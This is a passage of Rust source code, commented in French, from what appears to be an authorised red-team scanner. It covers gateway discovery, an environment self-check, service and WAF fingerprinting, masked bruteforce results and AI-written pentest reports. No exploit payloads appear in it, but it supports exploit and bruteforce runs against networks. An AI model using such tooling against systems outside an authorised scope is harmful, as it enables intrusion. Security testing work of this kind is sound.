    Ok(())
}

/// Détecte l'adresse IP de la gateway par défaut (cross-platform)
fn detect_local_gateway() -> Option<String> {
    // Méthode 1 : lire la table de routage via commande système
    #[cfg(windows)]
    {
        // route print sur Windows
        if let Ok(out) = std::process::Command::new("route")
            .arg("print")
            .arg("0.0.0.0")
            .output()
        {
            let s = String::from_utf8_lossy(&out.stdout);
            for line in s.lines() {
                let parts: Vec<&str> = line.split_whitespace().collect();
                // Chercher ligne avec 0.0.0.0  0.0.0.0  <gateway>
                if parts.len() >= 3 && parts[0] == "0.0.0.0" && parts[1] == "0.0.0.0" {
                    let gw = parts[2];
                    if is_valid_private_ip(gw) {
                        return Some(gw.to_string());
                    }
                }
            }
        }
        // Fallback : ipconfig
        if let Ok(out) = std::process::Command::new("ipconfig").output() {
            let s = String::from_utf8_lossy(&out.stdout);
            for line in s.lines() {
                let l = line.to_lowercase();
                if l.contains("default gateway") || l.contains("passerelle") {
                    if let Some(ip) = extract_ip_from_line(line) {
                        if is_valid_private_ip(&ip) {
                            return Some(ip);
                        }
                    }
                }
            }
        }
    }

    #[cfg(unix)]
    {
        // ip route (Linux / macOS modern)
        if let Ok(out) = std::process::Command::new("ip")
            .args(["route", "show", "default"])
            .output()
        {
            let s = String::from_utf8_lossy(&out.stdout);
            // Format: "default via 192.168.1.1 dev eth0"
            for line in s.lines() {
                let parts: Vec<&str> = line.split_whitespace().collect();
                if let Some(pos) = parts.iter().position(|&p| p == "via") {
                    if let Some(gw) = parts.get(pos + 1) {
                        if is_valid_private_ip(gw) {
                            return Some(gw.to_string());
                        }
                    }
                }
            }
        }
        // netstat -rn (macOS / BSD / older Linux)
        if let Ok(out) = std::process::Command::new("netstat").args(["-rn"]).output() {
            let s = String::from_utf8_lossy(&out.stdout);
            for line in s.lines() {
                let parts: Vec<&str> = line.split_whitespace().collect();
                if parts
                    .first()
                    .map(|&p| p == "default" || p == "0.0.0.0")
                    .unwrap_or(false)
                {
                    if let Some(gw) = parts.get(1) {
                        if is_valid_private_ip(gw) {
                            return Some(gw.to_string());
                        }
                    }
                }
            }
        }
        // route -n (Linux old-style)
        if let Ok(out) = std::process::Command::new("route").args(["-n"]).output() {
            let s = String::from_utf8_lossy(&out.stdout);
            for line in s.lines() {
                let parts: Vec<&str> = line.split_whitespace().collect();
                if parts.first().map(|&p| p == "0.0.0.0").unwrap_or(false) {
                    if let Some(gw) = parts.get(1) {
                        if is_valid_private_ip(gw) {
                            return Some(gw.to_string());
                        }
                    }
                }
            }
        }
    }

    // Méthode 2 : heuristique — essayer les gateways les plus communes
    for common in &[
        "192.168.1.1",
        "192.168.0.1",
        "10.0.0.1",
        "10.0.1.1",
        "172.16.0.1",
    ] {
        let addr: std::net::SocketAddr = format!("{}:80", common)
            .parse()
            .unwrap_or_else(|_| std::net::SocketAddr::from(([0, 0, 0, 0], 80)));
        if std::net::TcpStream::connect_timeout(&addr, std::time::Duration::from_millis(300))
            .is_ok()
        {
            return Some(common.to_string());
        }
    }

    None
}

fn is_valid_private_ip(s: &str) -> bool {
    if let Ok(addr) = s.parse::<std::net::Ipv4Addr>() {
        let oct = addr.octets();
        // RFC1918: 10.x, 172.16-31.x, 192.168.x  + non-zero
        (oct[0] == 10)
            || (oct[0] == 172 && (16..=31).contains(&oct[1]))
            || (oct[0] == 192 && oct[1] == 168)
    } else {
        false
    }
}

fn extract_ip_from_line(line: &str) -> Option<String> {
    // Extract last IPv4-looking token from a line
    line.split_whitespace()
        .filter(|tok| tok.contains('.'))
        .filter(|tok| tok.parse::<std::net::Ipv4Addr>().is_ok())
        .last()
        .map(|s| s.to_string())
}

// ── nrtg doctor — vérification de l'environnement ──────────────────────────
fn run_doctor(cli: &Cli) {
    use ansi::*;
    println!("\n  {MATRIX}{BOLD}▍ NRTG DOCTOR — Vérification de l'environnement{RESET}\n");

    let mut ok_count = 0usize;
    let mut warn_count = 0usize;
    let mut err_count = 0usize;

    macro_rules! check {
        (OK, $label:expr, $msg:expr) => {{
            println!("  {MATRIX}✓{RESET}  {:<30} {GRIS}{}{RESET}", $label, $msg);
            ok_count += 1;
        }};
        (WARN, $label:expr, $msg:expr) => {{
            println!("  {AMBER}⚠{RESET}  {:<30} {AMBER}{}{RESET}", $label, $msg);
            warn_count += 1;
        }};
        (ERR, $label:expr, $msg:expr) => {{
            println!("  {RED}✗{RESET}  {:<30} {RED}{}{RESET}", $label, $msg);
            err_count += 1;
        }};
    }

    // ── Fichiers de configuration ─────────────────────────────────────────
    println!("  {CYAN}── Fichiers de configuration{RESET}");

    // Les chemins par défaut sont résolus comme pour l'exécution réelle
    // (relatif au binaire puis remontée), sinon --doctor signalerait « absent »
    // sur des fichiers que le scanner trouve par ailleurs.
    let config_path = resolve_config_path(&cli.config);
    let risk_path = resolve_config_path(&cli.risk_rules);
    let exploits_path = resolve_config_path(&cli.exploits_config);

    // config.json
    if std::path::Path::new(&config_path).exists() {
        check!(OK, "config.json", format!("trouvé ({})", config_path));
    } else {
        check!(
            WARN,
            "config.json",
            format!("absent ({}) — valeurs CLI/défauts utilisées", config_path)
        );
    }

    // cve_db.json
    let cve_owned = resolve_config_path(&cli.cve_db);
    let cve_path = &cve_owned;
    if std::path::Path::new(cve_path).exists() {
        let parsed = std::fs::read_to_string(cve_path)
            .ok()
            .and_then(|s| serde_json::from_str::<serde_json::Value>(&s).ok());
        let as_obj = parsed.as_ref().and_then(|v| v.as_object());
        // Produits (on ignore les clés méta commençant par « _ »).
        let count = as_obj
            .map(|o| o.iter().filter(|(k, _)| !k.starts_with('_')).count())
            .unwrap_or(0);
        // Entrées CISA KEV (exploitées « in the wild ») — priorité maximale agent.
        let kev_count = as_obj
            .map(|o| {
                o.values()
                    .filter_map(|l| l.as_array())
                    .flatten()
                    .filter(|e| e["kev"].as_bool().unwrap_or(false))
                    .count()
            })
            .unwrap_or(0);
        // Fraîcheur de la base (p3a) : une base ancienne crée des angles morts.
        let age_days = std::fs::metadata(cve_path)
            .ok()
            .and_then(|m| m.modified().ok())
            .and_then(|t| t.elapsed().ok())
            .map(|d| d.as_secs() / 86_400);

        if count > 0 {
            let kev_note = if kev_count > 0 {
                format!(", {} KEV", kev_count)
            } else {
                String::new()
            };
            match age_days {
                Some(d) if d > 90 => check!(WARN, "cve_db.json",
                    format!("{} produits{} — base vieille de {} jours (>90) : relancez `nrtg --update-cve-db`", count, kev_note, d)),
                Some(d) => check!(OK, "cve_db.json",
                    format!("{} produits{} — fraîcheur {} jour(s)", count, kev_note, d)),
                None => check!(OK, "cve_db.json", format!("{} produits{} ({}) — OK", count, kev_note, cve_path)),
            }
        } else {
            check!(
                WARN,
                "cve_db.json",
                format!("vide — lancez : nrtg --update-cve-db")
            );
        }
    } else {
        check!(
            ERR,
            "cve_db.json",
            format!(
                "absent ({}) — CVE matching désactivé. Lancez : nrtg --update-cve-db",
                cve_path
            )
        );
    }

    // risk_rules.json
    if std::path::Path::new(&risk_path).exists() {
        check!(OK, "risk_rules.json", format!("trouvé ({})", risk_path));
    } else {
        check!(
            WARN,
            "risk_rules.json",
            format!("absent ({}) — règles par défaut utilisées", risk_path)
        );
    }

    // exploits.yaml
    if std::path::Path::new(&exploits_path).exists() {
        check!(OK, "exploits.yaml", format!("trouvé ({})", exploits_path));
    } else {
        check!(
            WARN,
            "exploits.yaml",
            format!(
                "absent ({}) — manifeste bundlé embarqué utilisé",
                exploits_path
            )
        );
    }

    // dashboard.html
    let dashboard_path = resolve_config_path("dashboard.html");
    if std::path::Path::new(&dashboard_path).exists() {
        check!(OK, "dashboard.html", format!("trouvé ({})", dashboard_path));
    } else {
        check!(
            WARN,
            "dashboard.html",
            "absent — visualisation graphe non disponible"
        );
    }

    println!();
    println!("  {CYAN}── Clés API (IA){RESET}");

    // Clés API
    let openai_key = std::env::var("OPENAI_API_KEY").ok();
    let openrouter_key = std::env::var("OPENROUTER_API_KEY").ok();
    let ollama_up = {
        // Test rapide de connexion Ollama (tentative TCP)
        let ollama_addr = std::net::SocketAddr::from(([127, 0, 0, 1], 11434));
        std::net::TcpStream::connect_timeout(&ollama_addr, std::time::Duration::from_millis(300))
            .is_ok()
    };

    if let Some(k) = &openai_key {
        let masked = format!(
            "{}…{}",
            &k[..8.min(k.len())],
            &k[k.len().saturating_sub(4)..]
        );
        check!(OK, "OPENAI_API_KEY", format!("définie ({})", masked));
    } else {
        check!(
            WARN,
            "OPENAI_API_KEY",
            "absente — rapport IA OpenAI désactivé"
        );
    }

    if let Some(k) = &openrouter_key {
        let masked = format!(
            "{}…{}",
            &k[..10.min(k.len())],
            &k[k.len().saturating_sub(4)..]
        );
        check!(OK, "OPENROUTER_API_KEY", format!("définie ({})", masked));
    } else {
        check!(
            WARN,
            "OPENROUTER_API_KEY",
            "absente — rapport IA OpenRouter désactivé"
        );
    }

    if ollama_up {
        check!(
            OK,
            "Ollama (local:11434)",
            "service détecté — --llm-provider ollama disponible"
        );
    } else {
        check!(
            WARN,
            "Ollama (local:11434)",
            "non disponible — IA locale désactivée"
        );
    }

    println!();
    println!("  {CYAN}── Dépendances système{RESET}");

    // NPCAP / libpcap
    #[cfg(windows)]
    {
        let npcap_ok = std::path::Path::new("C:\\Windows\\System32\\Npcap").exists()
            || std::path::Path::new("C:\\Windows\\System32\\wpcap.dll").exists();
        if npcap_ok {
            check!(OK, "NPCAP", "installé — --capture-iface disponible");
        } else {
            check!(
                WARN,
                "NPCAP",
                "absent — capture live désactivée (scan TCP/HTTP OK). https://npcap.com"
            );
        }
    }
    #[cfg(unix)]
    {
        let libpcap_ok = std::path::Path::new("/usr/lib/x86_64-linux-gnu/libpcap.so").exists()
            || std::path::Path::new("/usr/local/lib/libpcap.dylib").exists()
            || std::path::Path::new("/usr/lib/libpcap.so").exists()
            || std::path::Path::new("/opt/homebrew/lib/libpcap.dylib").exists();
        if libpcap_ok {
            check!(OK, "libpcap", "trouvé — --capture-iface disponible");
        } else {
            check!(WARN, "libpcap", "absent — sudo apt-get install libpcap-dev");
        }
    }

    // Docker
    let docker_ok = which_in_path("docker");
    if docker_ok {
        check!(OK, "Docker", "disponible — build Docker utilisable");
    } else {
        check!(WARN, "Docker", "absent — méthode Docker non disponible");
    }

    // Réseau — accès internet pour NVD (résolution DNS puis connexion TCP avec timeout)
    let nvd_ok = {
        use std::net::ToSocketAddrs;
        ("services.nvd.nist.gov", 443u16)
            .to_socket_addrs()
            .map(|addrs| {
                addrs.take(4).any(|addr| {
                    std::net::TcpStream::connect_timeout(
                        &addr,
                        std::time::Duration::from_millis(3000),
                    )
                    .is_ok()
                })
            })
            .unwrap_or(false)
    };
    if nvd_ok {
        check!(
            OK,
            "NVD API (internet)",
            "accessible — --update-cve-db fonctionnel"
        );
    } else {
        check!(
            WARN,
            "NVD API (internet)",
            "inaccessible — mise à jour CVE DB impossible hors-ligne"
        );
    }

    // ── Résumé ───────────────────────────────────────────────────────────────
    println!();
    println!("  {GRIS}────────────────────────────────────────────{RESET}");
    println!("  {MATRIX}✓{RESET} {ok_count} OK   {AMBER}⚠{RESET} {warn_count} avertissements   {RED}✗{RESET} {err_count} erreurs");
    println!();

    if err_count > 0 {
        println!("  {RED}Action requise :{RESET}");
        println!("  → Lancez {CYAN}nrtg --update-cve-db{RESET} pour télécharger la base CVE");
    }
    if warn_count > 0 {
        println!("  {AMBER}Recommandations :{RESET}");
        if openai_key.is_none() && openrouter_key.is_none() {
            println!(
                "  → Ajoutez OPENAI_API_KEY ou OPENROUTER_API_KEY dans .env pour activer l'IA"
            );
        }
    }
    println!("  {MATRIX}[ RÉSERVÉ AUX OPÉRATIONS RED TEAM AUTORISÉES ]{RESET}\n");
}

fn which_in_path(prog: &str) -> bool {
    std::env::var("PATH")
        .ok()
        .map(|p| {
            std::env::split_paths(&p)
                .any(|dir| dir.join(prog).exists() || dir.join(format!("{}.exe", prog)).exists())
        })
        .unwrap_or(false)
}

fn sibling_path(graph_out: &str, ext: &str) -> String {
    let p = graph_out
        .trim_end_matches(".json")
        .trim_end_matches(".JSON");
    if p == graph_out {
        format!("{}.{}", graph_out, ext)
    } else {
        format!("{}.{}", p, ext)
    }
}
fn sidecar_path_for(graph_out: &str) -> String {
    sibling_path(graph_out, "extras.json")
}

fn enrich_extras(extra_map: &mut HashMap<String, NodeExtra>, nodes: &[GraphNode]) {
    for n in nodes {
        let extra = extra_map.entry(n.id.clone()).or_default();

        // Estimate TTL from protocol/service heuristics (raw TTL not available without raw sockets)
        let ttl_guess: u32 = match n.protocol.as_str() {
            "ssh" | "ftp" | "smtp" | "redis" | "mongodb" | "mysql" | "postgresql" | "mssql" => 64,
            "http" | "https" => {
                // IIS → Windows → TTL 128, everything else → Linux → 64
                if n.banner.to_lowercase().contains("iis")
                    || n.banner.to_lowercase().contains("windows")
                {
                    128
                } else {
                    64
                }
            }
            "rdp" | "smb" => 128, // almost always Windows
            _ => 64,
        };
        let fp = fingerprint_os_from_ttl(ttl_guess);
        extra.ttl = Some(ttl_guess);
        extra.os_guess = fp.os_type.clone();
        extra.os_confidence = fp.confidence;

        // Parse HTTP headers stored in the banner string (format: "Key: val | Key: val")
        let headers = headers_from_banner_text(&n.banner);
        if !headers.is_empty() {
            let waf = detect_waf(&headers);
            if waf.detected {
                extra.waf = waf.waf_name.clone();
                extra.waf_confidence = waf.confidence;
            }
            let tech = detect_tech_stack(&headers, "");
            extra.tech_stack = tech_stack_summary(&tech);

            // Security hints (passive)
            let hints =
                crate::scanner::enhanced::analyze_security_headers(&headers, None, &n.product);
            if hints.default_creds_likely && n.risk < 4 {
                // Silently bump risk awareness in the banner field for the report
                // (we can't mutate risk here without refactor; we note it in tech_stack)
                let base = extra.tech_stack.clone().unwrap_or_default();
                extra.tech_stack = Some(format!("{} ⚠️default-creds-likely", base));
            }
            if !hints.missing_security_headers.is_empty() {
                let missing = hints.missing_security_headers.len();
                let base = extra.tech_stack.clone().unwrap_or_default();
                extra.tech_stack = Some(format!("{} missing-sec-headers={}", base, missing));
            }
            extra.http_headers = headers;
        }
    }
}

fn headers_from_banner_text(banner: &str) -> HashMap<String, String> {
    let mut map = HashMap::new();
    // Our new scanner stores headers as "Key: val | Key: val | ..."
    // Old format: newline-separated HTTP response headers
    let separator = if banner.contains(" | ") { " | " } else { "\n" };
    for segment in banner.split(separator) {
        if let Some((k, v)) = segment.split_once(':') {
            let key = k.trim().to_lowercase();
            if !key.is_empty() && !key.contains(' ') {
                map.insert(key, v.trim().to_string());
            }
        }
    }
    map
}

fn tech_stack_summary(t: &scanner::enhanced::TechStack) -> Option<String> {
    let mut parts: Vec<String> = Vec::new();
    if let Some(s) = &t.web_server {
        parts.push(format!("srv={}", s));
    }
    if let Some(s) = &t.framework {
        parts.push(format!("fw={}", s));
    }
    if let Some(s) = &t.language {
        parts.push(format!("lang={}", s));
    }
    if let Some(s) = &t.cms {
        parts.push(format!("cms={}", s));
    }
    for s in &t.javascript_frameworks {
        parts.push(format!("js={}", s));
    }
    for s in &t.databases {
        parts.push(format!("db={}", s));
    }
    if parts.is_empty() {
        None
    } else {
        Some(parts.join(" "))
    }
}

#[derive(Debug, Clone, Default, Serialize)]
struct PentestSummaryForMeta {
    total_signatures: usize,
    executed: usize,
    would_run: usize,
    vulnerable: usize,
    not_vulnerable: usize,
    errors: usize,
    skipped: usize,
    dry_run: bool,
    #[serde(default)]
    severity_count: HashMap<String, usize>,
}

fn build_host_reports(
    nodes: &[GraphNode],
    extras: &HashMap<String, NodeExtra>,
) -> Vec<exports::HostReport> {
    let mut by_host: HashMap<String, exports::HostReport> = HashMap::new();
    for n in nodes {
        let ent = by_host
            .entry(n.host.clone())
            .or_insert_with(|| exports::HostReport {
                ip: n.host.clone(),
                hostname: None,
                os: extras.get(&n.id).and_then(|e| e.os_guess.clone()),
                ports: vec![],
            });
        ent.ports.push(exports::PortReport {
            port: n.port,
            protocol: n.protocol.clone(),
            service: n.services.iter().next().cloned().unwrap_or_default(),
            version: if n.version != "unknown" {
                Some(n.version.clone())
            } else {
                None
            },
            banner: if n.banner != "unknown" {
                Some(n.banner.clone())
            } else {
                None
            },
        });
    }
    by_host.into_values().collect()
}

fn collect_unique_cves(nodes: &[GraphNode]) -> Vec<crate::cve::CveEntry> {
    let mut seen = HashSet::new();
    let mut out = Vec::new();
    for n in nodes {
        for (id, severity, desc, _extra) in &n.cves {
            if seen.insert(id.clone()) {
                out.push(crate::cve::CveEntry {
                    cve: id.clone(),
                    severity: *severity,
                    desc: desc.clone(),
                    affected_versions: vec![n.version.clone()],
                    vector: format!("https://nvd.nist.gov/vuln/detail/{}", id),
                    ..Default::default()
                });
            }
        }
    }
    out
}

#[derive(Debug, Serialize)]
struct Sidecar<'a> {
    generated_at: String,
    scan_id: &'a str,
    exploit_findings: &'a HashMap<String, Vec<ExploitFinding>>,
    node_extras: &'a HashMap<String, NodeExtra>,
    ai_analyses: &'a HashMap<String, TargetAnalysis>,
    ai_report: &'a Option<AiReport>,
    brute_findings: &'a Vec<crate::bruteforce::BruteReport>,
}

fn write_sidecar(
    path: &str,
    scan_id: &str,
    findings: &HashMap<String, Vec<ExploitFinding>>,
    extras: &HashMap<String, NodeExtra>,
    ai: &HashMap<String, TargetAnalysis>,
    ai_report: &Option<AiReport>,
    brute: &Vec<crate::bruteforce::BruteReport>,
) -> Result<()> {
    // OPSEC : le sidecar est écrit sur disque → les mots de passe trouvés par
    // bruteforce sont masqués. L'affichage console (opérateur) reste en clair.
    let brute_masked: Vec<crate::bruteforce::BruteReport> =
        brute.iter().map(crate::bruteforce::mask_report).collect();
    let sc = Sidecar {
        generated_at: Local::now().to_rfc3339(),
        scan_id,
        exploit_findings: findings,
        node_extras: extras,
        ai_analyses: ai,
        ai_report,
        brute_findings: &brute_masked,
    };
    let raw = serde_json::to_string_pretty(&sc)?;
    std::fs::write(path, raw)?;
    Ok(())
}

fn split_first_line(s: &str, max: usize) -> String {
    let s = s.lines().next().unwrap_or(s);
    if s.chars().count() <= max {
        s.into()
    } else {
        s.chars().take(max.saturating_sub(1)).collect::<String>() + "…"
    }
}

fn render_ai_markdown(ai: &AiReport, md: &crate::reports::ScanMetadata) -> String {
    let mut out = String::new();
    out.push_str(&format!(
        "# AI-Enhanced Pentest Report — {}\n\n",
        md.generated_at
    ));
    out.push_str(&format!(
        "**Scan ID:** `{}` | **Scope:** {}\n\n",
        md.scan_id,
        md.scope.clone().unwrap_or_default()
    ));
    out.push_str("## Executive Summary\n\n");
    out.push_str(&ai.executive_summary);
    out.push_str("\n\n");
    out.push_str("## Risk Narrative\n\n");
    out.push_str(&ai.risk_narrative);
    out.push_str("\n\n");
    out.push_str("## Top Findings\n\n");
    for f in &ai.top_findings {
        out.push_str(&format!("### [{}] {}\n\n", f.severity, f.title));
        out.push_str(&format!("- **Affected:** {}\n", f.affected));
        out.push_str(&format!("- **Evidence:** {}\n", f.evidence));
        out.push_str(&format!("- **Recommendation:** {}\n\n", f.recommendation));
    }
    out.push_str("## Remediation Plan\n\n");
    out.push_str("### Immediate (0–24h)\n\n");
    for s in &ai.remediation_plan.immediate {
        out.push_str(&format!("- {}\n", s));
    }
    out.push_str("\n### Short Term (1–4 weeks)\n\n");
    for s in &ai.remediation_plan.short_term {
        out.push_str(&format!("- {}\n", s));
    }
    out.push_str("\n### Long Term (1–3 months)\n\n");
    for s in &ai.remediation_plan.long_term {
        out.push_str(&format!("- {}\n", s));
    }
    out.push_str("\n## Illustrative Attacker Scenario\n\n");
    out.push_str(&ai.attacker_scenario);
    out.push('\n');
    out
}

// Also extend ScanMetadata struct fields (pentest_summary, ai_*) via a post-hoc sidecar
// approach without modifying reports.rs (to avoid touching its schema).
// For the actual serde serialisation of these extra fields, we patch reports.rs with
// a backward-compatible additive update below:

// (We cannot add fields to a foreign struct from here; instead, a compact runtime-only
// mirror is defined and merged at the JSON-writing boundary inside reports.rs via a
// wrapper we DON'T need — the sidecar file already contains the new info. So no-op.)

#[allow(dead_code)]
fn _unused(_: &dyn LlmClient) {}
